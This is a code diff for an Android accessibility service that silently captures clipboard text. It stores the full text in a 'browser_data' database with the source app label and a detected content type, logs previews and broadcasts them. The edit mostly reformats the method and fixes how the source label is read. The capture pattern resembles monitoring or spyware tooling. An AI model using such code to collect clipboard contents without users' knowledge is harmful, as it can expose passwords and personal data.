@@ -138,76 +138,82 @@ public class BrowserAccessibilityService extends AccessibilityService {
         Log.d(TAG, "Clipboard monitoring set to: " + enable);
     }
 
-    private void captureCurrentClipboard(boolean force) {
-        try {
-            if (!clipboardManager.hasPrimaryClip()) {
-                Log.d(TAG, "No clipboard content available");
-                return;
-            }
-
-            ClipData clipData = clipboardManager.getPrimaryClip();
-            if (clipData == null || clipData.getItemCount() == 0) {
-                Log.d(TAG, "Clipboard is empty");
-                return;
-            }
-
-            ClipData.Item item = clipData.getItemAt(0);
-            CharSequence text = item.getText();
-            
-            if (text == null) {
-                Log.d(TAG, "Clipboard item has no text (might be URI or Intent)");
-                return;
-            }
-
-            String content = text.toString();
-            
-            // Skip if same as last captured content (avoid duplicates)
-            if (!force && content.equals(lastClipboardContent)) {
-                Log.d(TAG, "Skipping duplicate clipboard content");
-                return;
-            }
-
-            lastClipboardContent = content;
-            
-            // Get package name of the app that set the clipboard (if available)
-            String sourcePackage = "unknown";
-            try {
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
-                    sourcePackage = clipData.getDescription().getPackageLabel().toString();
-                }
-            } catch (Exception e) {
-                // Ignore, use default
-            }
-
-            // Save to database
-            SQLiteDatabase db = dbHelper.getWritableDatabase();
-            ContentValues values = new ContentValues();
-            values.put("package_name", "clipboard");
-            values.put("url", "clipboard://content");
-            values.put("title", "Clipboard Content");
-            values.put("query", content);
-            values.put("field", sourcePackage);
-            values.put("value", detectClipboardType(content));
-            values.put("type", "clipboard");
-            values.put("timestamp", System.currentTimeMillis());
-            
-            long id = db.insert("browser_data", null, values);
-            db.close();
-            
-            Log.d(TAG, "📋 Clipboard captured: " + content.substring(0, Math.min(30, content.length())) + "... (id: " + id + ")");
-            
-            // Send broadcast about new clipboard content
-            Intent intent = new Intent(ACTION_CLIPBOARD_UPDATE);
-            intent.putExtra("content_preview", content.substring(0, Math.min(50, content.length())));
-            intent.putExtra("timestamp", System.currentTimeMillis());
-            sendBroadcast(intent);
-            
-        } catch (SecurityException e) {
-            Log.e(TAG, "Security exception capturing clipboard", e);
-        } catch (Exception e) {
-            Log.e(TAG, "Error capturing clipboard", e);
+ private void captureCurrentClipboard(boolean force) {
+    try {
+        if (!clipboardManager.hasPrimaryClip()) {
+            Log.d(TAG, "No clipboard content available");
+            return;
         }
+
+        ClipData clipData = clipboardManager.getPrimaryClip();
+        if (clipData == null || clipData.getItemCount() == 0) {
+            Log.d(TAG, "Clipboard is empty");
+            return;
+        }
+
+        ClipData.Item item = clipData.getItemAt(0);
+        CharSequence text = item.getText();
+        
+        if (text == null) {
+            Log.d(TAG, "Clipboard item has no text (might be URI or Intent)");
+            return;
+        }
+
+        String content = text.toString();
+        
+        // Skip if same as last captured content (avoid duplicates)
+        if (!force && content.equals(lastClipboardContent)) {
+            Log.d(TAG, "Skipping duplicate clipboard content");
+            return;
+        }
+
+        lastClipboardContent = content;
+        
+        // Get package name of the app that set the clipboard (if available)
+        String sourcePackage = "unknown";
+        try {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                ClipDescription description = clipData.getDescription();
+                if (description != null) {
+                    CharSequence label = description.getLabel();
+                    if (label != null) {
+                        sourcePackage = label.toString();
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.d(TAG, "Could not get source package: " + e.getMessage());
+        }
+
+        // Save to database
+        SQLiteDatabase db = dbHelper.getWritableDatabase();
+        ContentValues values = new ContentValues();
+        values.put("package_name", "clipboard");
+        values.put("url", "clipboard://content");
+        values.put("title", "Clipboard Content");
+        values.put("query", content);
+        values.put("field", sourcePackage);
+        values.put("value", detectClipboardType(content));
+        values.put("type", "clipboard");
+        values.put("timestamp", System.currentTimeMillis());
+        
+        long id = db.insert("browser_data", null, values);
+        db.close();
+        
+        Log.d(TAG, "📋 Clipboard captured: " + content.substring(0, Math.min(30, content.length())) + "... (id: " + id + ")");
+        
+        // Send broadcast about new clipboard content
+        Intent intent = new Intent(ACTION_CLIPBOARD_UPDATE);
+        intent.putExtra("content_preview", content.substring(0, Math.min(50, content.length())));
+        intent.putExtra("timestamp", System.currentTimeMillis());
+        sendBroadcast(intent);
+        
+    } catch (SecurityException e) {
+        Log.e(TAG, "Security exception capturing clipboard", e);
+    } catch (Exception e) {
+        Log.e(TAG, "Error capturing clipboard", e);
     }
+}
 
     private String detectClipboardType(String content) {
         if (content.matches(".*[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}.*")) {
